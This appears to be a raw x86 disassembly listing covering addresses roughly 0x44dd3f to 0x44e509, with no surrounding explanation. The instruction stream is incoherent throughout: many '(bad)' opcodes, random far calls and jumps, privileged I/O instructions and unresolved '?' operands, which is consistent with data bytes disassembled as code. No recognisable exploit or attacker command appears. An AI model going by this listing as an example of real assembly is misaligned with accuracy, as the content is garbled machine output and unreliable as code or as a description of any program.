  44dd3f:	ror    DWORD PTR [ecx+0x2e3b6435],0xf
  44dd46:	pop    DWORD PTR [ecx-0x36a5fd66]
  44dd4c:	(bad)  
  44dd4d:	js     0x44dd73
  44dd4f:	jge    0x44dd72
  44dd51:	out    0x5c,al
  44dd53:	cmp    eax,0x9665d95e
  44dd58:	mov    edx,0xa015d1c2
  44dd5d:	inc    esp
  44dd5e:	adc    eax,ecx
  44dd60:	retf   
  44dd61:	add    al,BYTE PTR [ebx+ebx*8]
  44dd64:	popa   
  44dd65:	(bad)  
  44dd66:	(bad)  [eax+0x4e]
  44dd69:	retf   0x9d14
  44dd6c:	mov    DWORD PTR [edi-0x33],esp
  44dd6f:	dec    ebx
  44dd70:	sub    DWORD PTR [esi],ebx
  44dd72:	sahf   
  44dd73:	pop    ds
  44dd74:	push   edi
  44dd75:	sbb    al,0x40
  44dd77:	mov    bl,BYTE PTR [edx-0x26]
  44dd7a:	aas    
  44dd7b:	mov    bh,0x64
  44dd7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44dd7e:	pop    edi
  44dd7f:	bound  esp,QWORD PTR [ebp-0x75cce08c]
  44dd85:	push   es
  44dd86:	outs   dx,DWORD PTR ds:[esi]
  44dd87:	popf   
  44dd88:	pop    esp
  44dd89:	fwait
  44dd8a:	sub    eax,0x11c066d4
  44dd8f:	dec    edi
  44dd90:	and    DWORD PTR [ecx+edx*2],ebp
  44dd93:	xor    eax,0x12d7558f
  44dd98:	xchg   esp,eax
  44dd99:	jno    0x44de19
  44dd9b:	push   esi
  44dd9c:	jae    0x44dd8b
  44dd9e:	pusha  
  44dd9f:	ins    BYTE PTR es:[edi],dx
  44dda0:	repz test al,0xab
  44dda3:	inc    edi
  44dda4:	arpl   WORD PTR [ebx+0x3675b91],ax
  44ddaa:	add    al,0xcb
  44ddac:	jle    0x44dd6a
  44ddae:	push   ebp
  44ddaf:	fwait
  44ddb0:	or     bl,dh
  44ddb2:	fisubr WORD PTR [edx+0x19857c83]
  44ddb8:	fadd   DWORD PTR [edx]
  44ddba:	sub    al,0x5e
  44ddbc:	xchg   BYTE PTR ds:0xd17c0d6c,ah
  44ddc2:	and    DWORD PTR [edi+0x6a93a8a9],ebx
  44ddc8:	test   BYTE PTR [edx],al
  44ddca:	ficomp DWORD PTR [ecx+0x1c3eeedc]
  44ddd0:	and    bh,BYTE PTR [edi]
  44ddd2:	nop
  44ddd3:	inc    ebp
  44ddd4:	and    eax,0x37c62403
  44ddd9:	push   cs
  44ddda:	rol    BYTE PTR [esi+0x352a0338],0xe3
  44dde1:	retf   0xaa2e
  44dde4:	out    0x72,eax
  44dde6:	add    bh,BYTE PTR [esp+ebp*4-0x6d650b1]
  44dded:	sahf   
  44ddee:	div    edi
  44ddf0:	mov    BYTE PTR [ecx-0x2bde10b4],ah
  44ddf6:	add    al,0xd7
  44ddf8:	fwait
  44ddf9:	jno    0x44ddd3
  44ddfb:	das    
  44ddfc:	and    BYTE PTR [ebx],al
  44ddfe:	nop
  44ddff:	ret    0xe9b8
  44de02:	popf   
  44de03:	aad    0x8d
  44de05:	inc    edi
  44de06:	test   DWORD PTR [edi-0x809a31d],ebp
  44de0c:	mov    BYTE PTR [edi+0x25],bl
  44de0f:	and    BYTE PTR [eax+ebx*4+0x26140b3],bl
  44de16:	mov    dh,BYTE PTR [edx]
  44de18:	jle    0x44dddd
  44de1a:	into   
  44de1b:	jno    0x44ddb5
  44de1d:	xor    BYTE PTR [edi],bl
  44de1f:	cmp    eax,edi
  44de21:	push   ss
  44de22:	dec    edi
  44de23:	jg     0x44de59
  44de25:	mov    al,ds:0x93fad478
  44de2a:	adc    eax,0x762837da
  44de2f:	cmp    DWORD PTR [edi-0x2f82ed31],eax
  44de35:	addr16 pop edi
  44de37:	lahf   
  44de38:	idiv   BYTE PTR [eax-0x67da28cf]
  44de3e:	add    eax,0xc7df77da
  44de43:	mov    esp,0x9466ebb5
  44de48:	mov    DWORD PTR [ebx+0x1b],ebp
  44de4b:	push   ds
  44de4c:	leave  
  44de4d:	cmc    
  44de4e:	mov    eax,ds:0xfa05f8f6
  44de53:	(bad)  
  44de54:	ror    BYTE PTR ds:0xab66696a,1
  44de5a:	pop    ds
  44de5b:	mov    ecx,0x177f1cf9
  44de60:	nop
  44de61:	jg     0x44debc
  44de63:	aam    0x19
  44de65:	int3   
  44de66:	inc    edx
  44de67:	jns    0x44de90
  44de69:	outs   dx,BYTE PTR ds:[esi]
  44de6a:	js     0x44dea8
  44de6c:	mov    DWORD PTR [ebp-0x27],esp
  44de6f:	sub    al,BYTE PTR [esp+ebx*4+0x23]
  44de73:	push   ecx
  44de74:	cdq    
  44de75:	add    ch,dh
  44de77:	jecxz  0x44de3f
  44de79:	xor    bh,bh
  44de7b:	out    0x6b,al
  44de7d:	xchg   ecx,eax
  44de7e:	pop    ds
  44de7f:	in     eax,0xf8
  44de81:	jno    0x44ded6
  44de83:	xor    ebp,esi
  44de85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44de86:	jp     0x44de5c
  44de88:	push   ecx
  44de89:	stos   DWORD PTR es:[edi],eax
  44de8a:	jbe    0x44de7d
  44de8c:	and    edx,DWORD PTR [ebp-0x5e7621c8]
  44de92:	gs dec edx
  44de94:	inc    ebp
  44de95:	adc    al,0x89
  44de97:	cwde   
  44de98:	scas   al,BYTE PTR es:[edi]
  44de99:	dec    ecx
  44de9a:	cld    
  44de9b:	or     al,0x70
  44de9d:	add    DWORD PTR [edi],0x5
  44dea0:	call   FWORD PTR [edi-0x7e3caefd]
  44dea6:	jb     0x44deb1
  44dea8:	call   0x6d36:0xae04701f
  44deaf:	xchg   ecx,eax
  44deb0:	cmp    esp,0xffffffc1
  44deb3:	imul   ebp,eax,0xe3caf78f
  44deb9:	in     eax,0xcd
  44debb:	retf   0xfcd0
  44debe:	sti    
  44debf:	sar    BYTE PTR [ecx+0x12f84e6f],cl
  44dec5:	pop    eax
  44dec6:	sahf   
  44dec7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44dec8:	inc    ebp
  44dec9:	add    eax,0x30b5596d
  44dece:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44decf:	shr    BYTE PTR [eax+0x179da4ba],cl
  44ded5:	add    esi,eax
  44ded7:	sub    eax,0x9724ee90
  44dedc:	jmp    0x44df57
  44dede:	push   ds
  44dedf:	mov    bl,0x46
  44dee1:	sub    edx,ecx
  44dee3:	and    DWORD PTR [edx-0x4b2bf37b],0x20
  44deea:	enter  0xb179,0x77
  44deee:	imul   ebx,DWORD PTR ds:0x9f900389,0x58f1133a
  44def8:	add    eax,DWORD PTR [edx]
  44defa:	xchg   bl,ch
  44defc:	jle    0x44df5c
  44defe:	dec    esp
  44deff:	mov    ebp,0x491f31d2
  44df04:	and    al,0x3b
  44df06:	fld    st(3)
  44df08:	in     al,dx
  44df09:	mov    ecx,0x71ded427
  44df0e:	out    dx,al
  44df0f:	adc    ch,bh
  44df11:	stos   BYTE PTR es:[edi],al
  44df12:	jmp    0x96e5:0xb00796fe
  44df19:	inc    ebp
  44df1a:	mov    WORD PTR [ecx+0x15],?
  44df1d:	mov    ecx,0x7c645947
  44df22:	push   ds
  44df23:	pop    esp
  44df24:	mov    bl,0x18
  44df26:	or     al,0x80
  44df28:	jmp    0x6287:0x890690ee
  44df2f:	in     eax,dx
  44df30:	and    eax,0xebf385
  44df35:	loop   0x44df6b
  44df37:	aam    0x9d
  44df39:	or     BYTE PTR [esi-0x1ce1a195],cl
  44df3f:	mov    eax,ds:0x4f1f577c
  44df44:	in     eax,dx
  44df45:	fisubr WORD PTR [eax+0x6362705f]
  44df4b:	aad    0x62
  44df4d:	pop    ebp
  44df4e:	les    eax,FWORD PTR [edx+0x27]
  44df51:	loop   0x44df39
  44df53:	push   0x4e
  44df55:	add    ecx,DWORD PTR [ebx+0x5c]
  44df58:	add    eax,0xfb0e56c7
  44df5d:	add    eax,0x5fa65d28
  44df62:	test   eax,0x6094aeb8
  44df67:	arpl   di,bp
  44df69:	xor    BYTE PTR [esi-0x43],bl
  44df6c:	xchg   BYTE PTR [esp+ebp*1],al
  44df6f:	mov    edx,0x900b8db1
  44df74:	dec    ecx
  44df75:	push   ebx
  44df76:	call   0xd031:0x614f8c78
  44df7d:	push   edi
  44df7e:	mov    cl,0x17
  44df80:	push   ecx
  44df81:	sub    al,0x37
  44df83:	fild   QWORD PTR [eax+0x3d4ad802]
  44df89:	pop    es
  44df8a:	cmp    edi,esi
  44df8c:	adc    al,0x6f
  44df8e:	pop    ds
  44df8f:	mov    bl,0x18
  44df91:	pop    ebp
  44df92:	jge    0x44df1a
  44df94:	pop    eax
  44df95:	inc    ebp
  44df96:	pop    ebp
  44df97:	mov    ds:0x7ba376ff,eax
  44df9c:	lea    esp,[eax-0x53]
  44df9f:	cdq    
  44dfa0:	or     BYTE PTR [esi-0x1276fb4b],dh
  44dfa6:	push   edx
  44dfa7:	sbb    al,0xa
  44dfa9:	xor    eax,0x305ad4d
  44dfae:	sub    al,0x49
  44dfb0:	lock push ebp
  44dfb2:	jle    0x44dfe1
  44dfb4:	add    DWORD PTR cs:[esi],ebx
  44dfb7:	std    
  44dfb8:	call   0xf69985d1
  44dfbd:	dec    ebx
  44dfbe:	mov    bl,0xd7
  44dfc0:	dec    eax
  44dfc1:	aaa    
  44dfc2:	ret    
  44dfc3:	dec    eax
  44dfc4:	mov    ds:0xdb5551ac,al
  44dfc9:	inc    esi
  44dfca:	ins    BYTE PTR es:[edi],dx
  44dfcb:	scas   eax,DWORD PTR es:[edi]
  44dfcc:	pop    edx
  44dfcd:	in     eax,dx
  44dfce:	pop    esi
  44dfcf:	jmp    0xc7625c3e
  44dfd4:	call   0xc51adc62
  44dfd9:	adc    eax,DWORD PTR [esi+0x5f03679e]
  44dfdf:	cmp    cl,BYTE PTR [ecx]
  44dfe1:	imul   esi,DWORD PTR [edx+0x5c],0xfffffffa
  44dfe5:	mov    BYTE PTR [eax],ah
  44dfe7:	aam    0xc5
  44dfe9:	inc    eax
  44dfea:	jnp    0x44df7b
  44dfec:	jmp    0x62b7:0x88796aaa
  44dff3:	mov    ch,0xa5
  44dff5:	aam    0x72
  44dff7:	cli    
  44dff8:	rol    DWORD PTR ds:0xa995a81e,1
  44dffe:	pop    ecx
  44dfff:	push   esi
  44e000:	sbb    eax,0x8880041c
  44e005:	cmc    
  44e006:	in     al,dx
  44e007:	and    ecx,DWORD PTR [edx-0x2]
  44e00a:	outs   dx,DWORD PTR ds:[esi]
  44e00b:	sub    ebx,DWORD PTR [ecx]
  44e00d:	add    esp,DWORD PTR [eax-0x4a]
  44e010:	enter  0xd480,0x3
  44e014:	mov    ds:0x3b236846,eax
  44e019:	call   0xb6cecb6d
  44e01e:	xchg   ebp,eax
  44e01f:	mov    DWORD PTR [edx-0x6eac499e],ebx
  44e025:	aam    0xf8
  44e027:	ja     0x44dfb1
  44e029:	mov    ebx,0x7f4b3b01
  44e02e:	dec    eax
  44e02f:	iret   
  44e030:	adc    eax,DWORD PTR [edx]
  44e032:	and    al,0x2b
  44e034:	jnp    0x44dfce
  44e036:	inc    eax
  44e037:	out    0xae,eax
  44e039:	mov    bl,0x60
  44e03b:	test   eax,0x739cab39
  44e040:	fdivr  DWORD PTR [eax-0x67]
  44e043:	(bad)  
  44e044:	and    DWORD PTR [esi],eax
  44e046:	xchg   ebp,ebp
  44e048:	jge    0x44dfca
  44e04a:	addr16 adc eax,0x296dc64e
  44e050:	pop    es
  44e051:	xor    ah,dl
  44e053:	push   edx
  44e054:	test   eax,0xa29ca6f3
  44e059:	add    eax,0xd15b7f3a
  44e05e:	imul   esp,DWORD PTR [eax+0x7b60e5e6],0x30
  44e065:	cmp    al,0x87
  44e067:	or     DWORD PTR [ecx+eiz*2+0x28],ecx
  44e06b:	aam    0x27
  44e06d:	dec    edi
  44e06e:	mov    ch,0x9b
  44e070:	neg    bh
  44e072:	jmp    0xc4d5:0xfbd1fa89
  44e079:	inc    ebx
  44e07a:	push   esp
  44e07b:	rol    BYTE PTR [ebp+edx*1-0xb],1
  44e07f:	pop    ss
  44e080:	push   ebx
  44e081:	ret    
  44e082:	mov    edi,0x6e1e512b
  44e087:	or     cl,BYTE PTR [esi+0x2e]
  44e08a:	sub    eax,0xf50049b7
  44e08f:	xchg   BYTE PTR [ecx-0x2289f093],cl
  44e095:	adc    ah,ah
  44e097:	test   BYTE PTR [eax+0x2],ah
  44e09a:	bound  eax,QWORD PTR [edx-0x34]
  44e09d:	jnp    0x44e05b
  44e09f:	mov    ch,0xfd
  44e0a1:	cwde   
  44e0a2:	add    eax,0x991b8822
  44e0a7:	jl     0x44e05e
  44e0a9:	sar    BYTE PTR [eax+0x5f],1
  44e0ac:	mov    eax,DWORD PTR [edx]
  44e0ae:	lock out dx,al
  44e0b0:	push   esi
  44e0b1:	pop    es
  44e0b2:	or     DWORD PTR [ebx+0x29],0x69f97deb
  44e0b9:	data16 fwait
  44e0bb:	aad    0x33
  44e0bd:	adc    al,0x70
  44e0bf:	xchg   edx,eax
  44e0c0:	xlat   BYTE PTR ds:[ebx]
  44e0c1:	add    eax,0x789051ac
  44e0c6:	dec    esi
  44e0c7:	mov    cl,0x6d
  44e0c9:	xor    eax,0x87df771e
  44e0ce:	(bad)  
  44e0cf:	pusha  
  44e0d0:	jp     0x44e07f
  44e0d2:	mov    ds:0x903d3bd4,al
  44e0d7:	cmp    DWORD PTR [ebx-0x5a],edi
  44e0da:	pop    sp
  44e0dc:	mov    BYTE PTR [ebx-0x27],ch
  44e0df:	mov    edi,0x616f7674
  44e0e4:	add    eax,0x79be403
  44e0e9:	and    al,BYTE PTR [ebp+0x5]
  44e0ec:	pop    ss
  44e0ed:	test   al,0x63
  44e0ef:	lods   eax,DWORD PTR ds:[esi]
  44e0f0:	sbb    BYTE PTR [ecx+edi*1-0x23],bl
  44e0f4:	sub    dl,al
  44e0f6:	mov    ebx,0xa4c21a31
  44e0fb:	aam    0xc0
  44e0fd:	(bad)  
  44e0fe:	fs add dl,dl
  44e101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44e102:	jbe    0x44e0ac
  44e104:	xchg   esi,eax
  44e105:	arpl   WORD PTR [ecx],di
  44e107:	leave  
  44e108:	push   0x82a7cb42
  44e10d:	test   BYTE PTR [ebp-0x2c],ah
  44e110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e111:	push   esp
  44e112:	pop    ecx
  44e113:	add    ecx,esi
  44e115:	fsub   DWORD PTR [edi]
  44e117:	fdivp  st(7),st
  44e119:	and    eax,0x8d89cf48
  44e11e:	push   ebp
  44e11f:	pop    eax
  44e120:	aam    0x7e
  44e122:	xchg   ebp,eax
  44e123:	sbb    BYTE PTR [ebx+eax*1+0x40],ch
  44e127:	test   DWORD PTR [ecx+0x4e2ae737],ebx
  44e12d:	sbb    DWORD PTR [ebp+0x2702e077],0xe16c338
  44e137:	into   
  44e138:	xchg   ebx,eax
  44e139:	add    eax,0x53c1cc00
  44e13e:	mov    ecx,0x1e7f2712
  44e143:	popf   
  44e144:	addr16 inc esp
  44e146:	mov    bh,0xc2
  44e148:	cmp    al,0x37
  44e14a:	push   edx
  44e14b:	shr    BYTE PTR [eax],cl
  44e14d:	loope  0x44e191
  44e14f:	dec    ecx
  44e150:	aas    
  44e151:	call   0x6469b5c6
  44e156:	ficomp WORD PTR [eax-0x77]
  44e159:	xchg   edi,eax
  44e15a:	xchg   esp,eax
  44e15b:	mov    cl,0x5e
  44e15d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44e15e:	les    ecx,FWORD PTR [edi]
  44e160:	mov    dh,0x74
  44e162:	aas    
  44e163:	out    0x89,al
  44e165:	xor    eax,0x4085b522
  44e16a:	jno    0x44e15d
  44e16c:	sub    DWORD PTR [ebx],eax
  44e16e:	(bad)  
  44e16f:	(bad)  
  44e170:	in     al,dx
  44e171:	mov    esi,0xffe71eea
  44e176:	push   ss
  44e177:	sahf   
  44e178:	mov    ebp,eax
  44e17a:	cmp    ch,BYTE PTR ds:0xc5759ae6
  44e180:	jb     0x44e185
  44e182:	sbb    BYTE PTR [edx+0x3c],al
  44e185:	inc    eax
  44e186:	dec    esi
  44e187:	push   eax
  44e188:	fdivr  QWORD PTR ds:0x8d861957
  44e18e:	lahf   
  44e18f:	or     dh,BYTE PTR [esi-0x6bfa147f]
  44e195:	or     cl,BYTE PTR [edi]
  44e197:	aam    0x5b
  44e199:	lock clc 
  44e19b:	cmp    bh,ch
  44e19d:	lock test eax,0xe831899b
  44e1a3:	test   DWORD PTR [edi+0x3e],ecx
  44e1a6:	ffree  st(3)
  44e1a8:	adc    eax,DWORD PTR [edx]
  44e1aa:	cs pop esi
  44e1ac:	aam    0x6
  44e1ae:	add    cl,bl
  44e1b0:	call   0x22c60023
  44e1b5:	loop   0x44e1bb
  44e1b7:	jo     0x44e183
  44e1b9:	sub    DWORD PTR [ebp-0x2b],esp
  44e1bc:	or     DWORD PTR [esi-0x3a5c2535],esi
  44e1c2:	(bad)
  44e1c5:	mov    ebx,0x4227a7e8
  44e1ca:	repnz adc edx,0x5b
  44e1ce:	addr16 aam 0xe9
  44e1d1:	lock jmp 0x8986:0x2f5de27b
  44e1d9:	jno    0x44e1e9
  44e1db:	popa   
  44e1dc:	stc    
  44e1dd:	adc    DWORD PTR [edi+0x2c03568b],esi
  44e1e3:	pop    ebp
  44e1e4:	cdq    
  44e1e5:	sub    esi,ecx
  44e1e7:	jnp    0x44e1b8
  44e1e9:	mov    ds:0x5da3611f,al
  44e1ee:	imul   ecx,DWORD PTR [ebx],0xffffffb0
  44e1f1:	fistp  QWORD PTR [edx+0x408b66ab]
  44e1f7:	sbb    WORD PTR [ebx],ax
  44e1fa:	popa   
  44e1fb:	loopne 0x44e225
  44e1fd:	test   BYTE PTR [edi],bl
  44e1ff:	call   FWORD PTR [edi]
  44e201:	jl     0x44e207
  44e203:	add    BYTE PTR [eax+0x3ed5f956],bl
  44e209:	repnz repnz mov cs,WORD PTR [ebp+ebx*4-0x7fd6fcfe]
  44e212:	ret    
  44e213:	mov    ah,0x89
  44e215:	mov    bl,0x3d
  44e217:	(bad)  
  44e218:	fcom   DWORD PTR [edi]
  44e21a:	or     bl,cl
  44e21c:	rol    BYTE PTR ds:0x3304ad14,1
  44e222:	(bad)  
  44e223:	sbb    al,0x27
  44e225:	mov    BYTE PTR [edi],bl
  44e227:	inc    ebx
  44e228:	les    ebp,FWORD PTR [eax+0x61]
  44e22b:	dec    eax
  44e22c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44e22d:	adc    eax,0x883cd45b
  44e232:	cs inc ebp
  44e234:	nop
  44e235:	push   ss
  44e236:	push   ebx
  44e237:	leave  
  44e238:	mov    ecx,esp
  44e23a:	fisubr DWORD PTR [ebp+0x7fc9889a]
  44e240:	aaa    
  44e241:	add    bh,BYTE PTR [edx+ecx*4-0x18f8a3d5]
  44e248:	sub    eax,0xcaa31fc7
  44e24d:	sbb    ch,BYTE PTR [ebp+0x2ac83867]
  44e253:	out    dx,eax
  44e254:	add    DWORD PTR [edx],eax
  44e256:	mov    esp,0xc5cba0b6
  44e25b:	xchg   edi,eax
  44e25c:	mov    ch,0xb0
  44e25e:	cdq    
  44e25f:	jge    0x44e22d
  44e261:	add    eax,0x5fb5b91c
  44e266:	mov    edi,ebp
  44e268:	call   0xad6a0e8a
  44e26d:	popf   
  44e26e:	mov    edx,0x479942d5
  44e273:	dec    BYTE PTR [eax+0x456f0775]
  44e279:	adc    ah,al
  44e27b:	in     al,0xd1
  44e27d:	add    eax,0x411c3d8a
  44e282:	xlat   BYTE PTR ds:[ebx]
  44e283:	stc    
  44e284:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e285:	loopne 0x44e2e7
  44e287:	test   eax,0x5e3da2cd
  44e28c:	(bad)  
  44e28d:	out    dx,al
  44e28e:	fwait
  44e28f:	aam    0xde
  44e291:	or     BYTE PTR [ebp-0x316d020e],ah
  44e297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44e298:	jge    0x44e278
  44e29a:	call   0xe7d5:0xa7037d89
  44e2a1:	iret   
  44e2a2:	mov    cl,0x2f
  44e2a4:	jae    0x44e30d
  44e2a6:	add    al,0xf1
  44e2a8:	mov    bl,0x5
  44e2aa:	fmulp  st(5),st
  44e2ac:	cld    
  44e2ad:	ret    
  44e2ae:	sbb    ebp,DWORD PTR [ecx]
  44e2b0:	xchg   DWORD PTR [ebx-0xbb00f9d],eax
  44e2b6:	pusha  
  44e2b7:	dec    esp
  44e2b8:	outs   dx,BYTE PTR ds:[esi]
  44e2b9:	jo     0x44e2a4
  44e2bb:	aad    0x1e
  44e2bd:	ret    
  44e2be:	add    ebx,DWORD PTR [ebx+0x39]
  44e2c1:	les    esp,FWORD PTR [eax+0x8d9f276]
  44e2c7:	aam    0x15
  44e2c9:	cs scas eax,DWORD PTR es:[edi]
  44e2cb:	aad    0x78
  44e2cd:	mov    ebp,0x49acd5ed
  44e2d2:	push   ebp
  44e2d3:	mov    dh,0xff
  44e2d5:	ror    ebx,cl
  44e2d7:	popa   
  44e2d8:	mov    cl,dh
  44e2da:	or     ecx,DWORD PTR [ebx-0x15]
  44e2dd:	fiadd  DWORD PTR [eax]
  44e2df:	lea    esi,[ebp+0x1d]
  44e2e2:	scas   al,BYTE PTR es:[edi]
  44e2e3:	pandn  mm4,QWORD PTR [edi-0x3b260218]
  44e2ea:	xrelease mov DWORD PTR fs:[ecx],edx
  44e2ee:	or     DWORD PTR [esi],esi
  44e2f0:	dec    esi
  44e2f1:	cld    
  44e2f2:	push   0xa81fb731
  44e2f7:	or     al,0xdb
  44e2f9:	loop   0x44e314
  44e2fb:	(bad)  
  44e2fc:	sbb    BYTE PTR [ebx+0x7f],bh
  44e2ff:	inc    DWORD PTR [edi+0x4520a6af]
  44e305:	iret   
  44e306:	and    BYTE PTR [esp+esi*2-0x772a23b9],bl
  44e30d:	cmp    bh,ah
  44e30f:	pop    esp
  44e310:	add    DWORD PTR [edx+0x1d897867],esi
  44e316:	pop    esp
  44e317:	jae    0x44e2fc
  44e319:	xor    esp,DWORD PTR [edx-0x19]
  44e31c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e31d:	add    dh,BYTE PTR [edx]
  44e31f:	loop   0x44e31c
  44e321:	into   
  44e322:	inc    eax
  44e323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44e324:	hlt    
  44e325:	imul   ebx,DWORD PTR [esi],0x5c8740f7
  44e32b:	icebp  
  44e32c:	jo     0x44e382
  44e32e:	dec    esp
  44e32f:	aad    0x7
  44e331:	int    0x8e
  44e333:	es and al,0xab
  44e336:	and    al,0x52
  44e338:	xchg   esp,eax
  44e339:	dec    ebx
  44e33a:	rcl    BYTE PTR [edx],0xdd
  44e33d:	xchg   edi,eax
  44e33e:	lock mov bl,0x8
  44e341:	adc    DWORD PTR [ebx+0x1e29ad43],eax
  44e347:	cli    
  44e348:	rcl    ebx,0x9f
  44e34b:	sub    eax,0x5a83b3e6
  44e350:	xchg   esi,eax
  44e351:	inc    edi
  44e352:	in     al,dx
  44e353:	jbe    0x44e3b6
  44e355:	sub    al,0x26
  44e357:	aam    0x68
  44e359:	push   eax
  44e35a:	push   eax
  44e35b:	xchg   esp,eax
  44e35c:	xchg   edx,eax
  44e35d:	add    eax,0xe3e24b18
  44e362:	popa   
  44e363:	push   ebp
  44e364:	mov    ebx,0x8848028f
  44e369:	fist   WORD PTR [edx+0x572c295c]
  44e36f:	sar    BYTE PTR [edi+ebx*1-0x2b966c0e],0x8f
  44e377:	(bad)  
  44e379:	push   0xd5887ab6
  44e37e:	xchg   esp,eax
  44e37f:	mov    bl,0xbb
  44e381:	inc    edi
  44e382:	add    DWORD PTR ds:0x8e0605de,ebx
  44e388:	ja     0x44e334
  44e38a:	xchg   esi,eax
  44e38b:	push   eax
  44e38c:	in     eax,0xaa
  44e38e:	pop    ds
  44e38f:	mov    ebp,0x605300a9
  44e394:	cmp    al,0xc7
  44e396:	dec    edi
  44e397:	pushf  
  44e398:	nop
  44e399:	jae    0x44e354
  44e39b:	aam    0xbf
  44e39d:	fwait
  44e39e:	test   al,0x3c
  44e3a0:	mov    esi,0x1d2d1e2e
  44e3a5:	push   eax
  44e3a6:	into   
  44e3a7:	inc    ecx
  44e3a8:	lock sbb esp,esp
  44e3ab:	aad    0xc7
  44e3ad:	leave  
  44e3ae:	aam    0xe9
  44e3b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44e3b1:	sbb    dh,BYTE PTR [edx]
  44e3b3:	and    eax,0x74b96789
  44e3b8:	inc    ebx
  44e3b9:	xchg   ecx,eax
  44e3ba:	cld    
  44e3bb:	and    edx,DWORD PTR [ebp+eax*4-0x59]
  44e3bf:	retf   
  44e3c0:	xchg   ebp,eax
  44e3c1:	mov    dh,0x5c
  44e3c3:	push   esi
  44e3c4:	dec    ecx
  44e3c5:	retf   0x2400
  44e3c8:	inc    ecx
  44e3c9:	in     eax,0x1f
  44e3cb:	pop    ebp
  44e3cc:	xchg   esi,eax
  44e3cd:	scas   al,BYTE PTR es:[edi]
  44e3ce:	adc    bh,0x2c
  44e3d1:	std    
  44e3d2:	leave  
  44e3d3:	stos   BYTE PTR es:[edi],al
  44e3d4:	sbb    ecx,ebx
  44e3d6:	add    DWORD PTR [eax],edi
  44e3d8:	mov    ch,0xe2
  44e3da:	push   edx
  44e3db:	mov    ?,WORD PTR [ecx-0xe166ccb]
  44e3e1:	lock mov al,ds:0x68f6dd96
  44e3e7:	mov    cl,0x5b
  44e3e9:	(bad)
  44e3ed:	ins    DWORD PTR es:[edi],dx
  44e3ee:	inc    esi
  44e3ef:	mov    esi,0x60fc24b3
  44e3f4:	jle    0x44e37e
  44e3f6:	and    BYTE PTR [edx-0x5fae9a1d],al
  44e3fc:	mov    es,WORD PTR [edi+0x5b407a71]
  44e402:	(bad)  
  44e404:	mov    ebp,0xe236e66d
  44e409:	add    ch,BYTE PTR [esi-0x72]
  44e40c:	mov    cl,0xe4
  44e40e:	pop    esi
  44e40f:	arpl   WORD PTR [ebx],bx
  44e411:	jle    0x44e42f
  44e413:	nop
  44e414:	mov    ?,ebp
  44e416:	jmp    0x24b7:0x1407b9a9
  44e41d:	(bad)  
  44e41e:	jns    0x44e3f5
  44e420:	or     DWORD PTR [edx],0x49
  44e423:	mov    ah,0xc8
  44e425:	sub    al,0x4e
  44e427:	sbb    cl,BYTE PTR [ecx+0x78916f17]
  44e42d:	mov    eax,0x349d8c45
  44e432:	fsub   DWORD PTR [esi]
  44e434:	aam    0x5
  44e436:	out    dx,al
  44e437:	mov    esp,0x8409094a
  44e43c:	call   0xfbac03cd
  44e441:	mov    esp,0xbfae9a8a
  44e446:	push   edi
  44e447:	aam    0x52
  44e449:	push   ss
  44e44a:	std    
  44e44b:	jae    0x44e3e9
  44e44d:	loope  0x44e468
  44e44f:	jp     0x44e3da
  44e451:	cmp    eax,ebp
  44e453:	xchg   BYTE PTR [ebx],al
  44e455:	push   es
  44e456:	(bad)  
  44e457:	sub    cl,dh
  44e459:	add    eax,0x52c9436
  44e45e:	cmp    al,0x8f
  44e460:	shl    BYTE PTR [edi+0x66],0xdd
  44e464:	(bad)  
  44e465:	je     0x44e418
  44e467:	mov    eax,0xa5d92909
  44e46c:	sub    dl,dh
  44e46e:	dec    esp
  44e46f:	cwde   
  44e470:	cmp    al,bl
  44e472:	repnz aad 0x78
  44e475:	mov    esp,DWORD PTR [edx+0x1e32aae4]
  44e47b:	push   ebp
  44e47c:	xor    eax,0x20b487ef
  44e481:	sbb    eax,0xffbdd791
  44e486:	aas    
  44e487:	cld    
  44e488:	(bad)  
  44e489:	test   BYTE PTR [ebp+edi*1-0x7],bl
  44e48d:	inc    esi
  44e48e:	and    eax,DWORD PTR [ebx-0x6c]
  44e491:	sub    eax,0x5a66818
  44e496:	jg     0x44e4aa
  44e498:	xor    DWORD PTR [eax+0x16435f8e],ecx
  44e49e:	pop    ds
  44e49f:	gs jne 0x44e4d1
  44e4a2:	jno    0x44e478
  44e4a4:	pop    edi
  44e4a5:	xor    al,0x9d
  44e4a7:	cmp    eax,DWORD PTR [ecx+ecx*2+0x0]
  44e4ab:	mov    DWORD PTR [eax+0x3],edi
  44e4ae:	je     0x44e4dc
  44e4b0:	or     al,0xbd
  44e4b2:	mov    bl,0xf
  44e4b4:	jno    0x44e4b8
  44e4b6:	sub    BYTE PTR [ecx-0x3696d697],dl
  44e4bc:	ja     0x44e52e
  44e4be:	push   ds
  44e4bf:	jnp    0x44e4da
  44e4c1:	call   0xba29:0x7fdabc15
  44e4c8:	test   al,0xad
  44e4ca:	pop    edi
  44e4cb:	(bad)  
  44e4cd:	xor    al,0x1f
  44e4cf:	leave  
  44e4d0:	mov    ah,0x2d
  44e4d2:	hlt    
  44e4d3:	and    eax,0xe1c9d8e
  44e4d8:	ds out 0x78,eax
  44e4db:	jb     0x44e47d
  44e4dd:	xor    bh,BYTE PTR [ecx-0x7dfd29cd]
  44e4e3:	repz ds ss xor eax,0x609d18f7
  44e4eb:	jg     0x44e483
  44e4ed:	jge    0x44e51a
  44e4ef:	cmp    eax,0xc3326aa7
  44e4f4:	add    ch,BYTE PTR ss:[esi]
  44e4f7:	sbb    DWORD PTR [edi],ecx
  44e4f9:	adc    bh,ah
  44e4fb:	mov    bh,0xe2
  44e4fd:	(bad)  
  44e4fe:	push   0xb
  44e500:	add    BYTE PTR [ebp+0x14],cl
  44e503:	mov    ds:0x45bc4688,eax
  44e508:	inc    esi
  44e509:	pop    ds
